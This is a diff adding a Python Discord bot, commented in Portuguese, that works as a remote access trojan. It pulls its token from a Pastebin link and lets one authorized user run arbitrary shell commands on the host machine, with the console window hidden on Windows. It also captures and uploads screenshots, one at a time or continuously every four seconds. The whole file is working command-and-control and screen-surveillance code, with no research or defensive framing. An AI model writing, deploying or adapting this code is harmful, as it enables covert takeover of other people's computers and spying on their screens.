@@ -1,0 +1,197 @@
+import os
+import sys
+import subprocess
+import json
+import urllib.request
+import csv
+
+# 🔧 Instalação automática dos módulos necessários
+required_modules = ["discord", "mss", "Pillow"]
+for module in required_modules:
+    try:
+        __import__(module)
+    except ImportError:
+        print(f"📦 Módulo '{module}' não encontrado. Instalando...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", module])
+
+# ✅ Imports garantidos após instalação
+import discord
+from discord.ext import commands, tasks
+import asyncio
+import mss
+import mss.tools
+from PIL import Image  # Import Pillow aqui
+
+# ⛔ Verifica se o nome do bot foi fornecido como argumento
+try:
+    with open("bot.txt", "r", encoding="utf-8") as f:
+        BOT_NAME = f.read().strip()
+    if not BOT_NAME:
+        raise ValueError("Arquivo bot.txt está vazio.")
+except Exception as e:
+    print(f"❌ Erro ao ler o nome do bot no arquivo 'bot.txt': {e}")
+    sys.exit(1)
+
+# 🔗 URL do pastebin
+PASTEBIN_URL = "https://pastebin.com/raw/ijP3CEQw"
+
+try:
+    req = urllib.request.Request(
+        PASTEBIN_URL,
+        headers={"User-Agent": "Mozilla/5.0"}
+    )
+    with urllib.request.urlopen(req) as response:
+        token_data = json.loads(response.read().decode())
+        TOKEN = token_data.get(BOT_NAME)
+
+        if not TOKEN:
+            print(f"❌ Nome do bot '{BOT_NAME}' não encontrado no pastebin.")
+            sys.exit(1)
+
+except Exception as e:
+    print(f"⚠️ Erro ao buscar tokens: {e}")
+    sys.exit(1)
+
+# 👤 Usuários autorizados (pode expandir isso se quiser que venha do pastebin também)
+AUTHORIZED_USERS = [1368317247956979755]
+
+intents = discord.Intents.default()
+intents.messages = True
+intents.message_content = True
+
+bot = commands.Bot(command_prefix=f"{BOT_NAME}!", intents=intents)
+
+# Variáveis para o loop de screenshot
+screenshot_task = None
+screenshot_message = None
+screenshot_channel_id = None  # Para manter o canal onde o comando foi chamado
+
+@bot.event
+async def on_ready():
+    print(f"✅ Bot '{BOT_NAME}' conectado como {bot.user}")
+
+@bot.command(name="remote")
+async def remote(ctx, *, cmd: str):
+    if ctx.author.id not in AUTHORIZED_USERS:
+        await ctx.send("❌ Você não tem permissão para usar este comando.")
+        return
+
+    try:
+        proc = await asyncio.create_subprocess_shell(
+            cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.STDOUT,
+            creationflags=0x08000000 if os.name == 'nt' else 0
+        )
+
+        stdout, _ = await proc.communicate()
+        result = stdout.decode(errors="replace")
+
+        if not result.strip():
+            result = "✅ Comando executado sem saída."
+
+        if len(result) > 1900:
+            await ctx.send("⚠️ Saída muito longa, truncando...")
+            result = result[:1900]
+
+        await ctx.send(f"```\n{result}\n```")
+
+    except Exception as ex:
+        await ctx.send(f"⚠️ Erro inesperado: {str(ex)}")
+
+@bot.command(name="screenshot")
+async def screenshot(ctx):
+    if ctx.author.id not in AUTHORIZED_USERS:
+        await ctx.send("❌ Você não tem permissão para usar este comando.")
+        return
+
+    screenshot_path = "screenshot.png"
+    compressed_path = "screenshot_compressed.jpg"
+
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]
+        sct_img = sct.grab(monitor)
+        mss.tools.to_png(sct_img.rgb, sct_img.size, output=screenshot_path)
+
+    # Comprime com Pillow
+    img = Image.open(screenshot_path)
+    img = img.convert("RGB")  # JPEG não suporta alfa
+    img.save(compressed_path, "JPEG", quality=60)
+
+    await ctx.send("🖼️ Screenshot capturada (comprimida):", file=discord.File(compressed_path))
+
+@bot.event
+async def on_message_edit(before, after):
+    if after.author.bot:
+        return
+    ctx = await bot.get_context(after)
+    if ctx.valid:
+        await bot.process_commands(after)
+
+# ----- NOVOS COMANDOS PARA SCREENSHOT CONTÍNUA ----- #
+
+async def screenshot_loop(channel):
+    global screenshot_message
+
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]
+
+        while True:
+            screenshot_path = "screenshot.png"
+            compressed_path = "screenshot_compressed.jpg"
+
+            sct_img = sct.grab(monitor)
+            mss.tools.to_png(sct_img.rgb, sct_img.size, output=screenshot_path)
+
+            # Comprime com Pillow
+            img = Image.open(screenshot_path)
+            img = img.convert("RGB")
+            img.save(compressed_path, "JPEG", quality=60)
+
+            file = discord.File(compressed_path, filename="screenshot.jpg")
+
+            if screenshot_message is None:
+                # Envia a primeira mensagem com a imagem
+                screenshot_message = await channel.send("📸 Screenshot contínua iniciada:", file=file)
+            else:
+                # Edita a mensagem para atualizar a imagem
+                await screenshot_message.edit(content="📸 Screenshot contínua (atualizada):", attachments=[file])
+
+            await asyncio.sleep(4)
+
+@bot.command(name="startscreen")
+async def startscreen(ctx):
+    global screenshot_task, screenshot_message, screenshot_channel_id
+
+    if ctx.author.id not in AUTHORIZED_USERS:
+        await ctx.send("❌ Você não tem permissão para usar este comando.")
+        return
+
+    if screenshot_task and not screenshot_task.done():
+        await ctx.send("⚠️ A captura contínua já está em execução.")
+        return
+
+    screenshot_message = None
+    screenshot_channel_id = ctx.channel.id
+    screenshot_task = bot.loop.create_task(screenshot_loop(ctx.channel))
+    await ctx.send("▶️ Iniciando captura contínua de screenshots a cada 4 segundos...")
+
+@bot.command(name="stopscreen")
+async def stopscreen(ctx):
+    global screenshot_task, screenshot_message
+
+    if ctx.author.id not in AUTHORIZED_USERS:
+        await ctx.send("❌ Você não tem permissão para usar este comando.")
+        return
+
+    if screenshot_task and not screenshot_task.done():
+        screenshot_task.cancel()
+        screenshot_task = None
+        screenshot_message = None
+        await ctx.send("⏹️ Captura contínua de screenshots parada.")
+    else:
+        await ctx.send("⚠️ Nenhuma captura contínua está em execução.")
+
+# -------------------------------------------------- #
+
+bot.run(TOKEN)
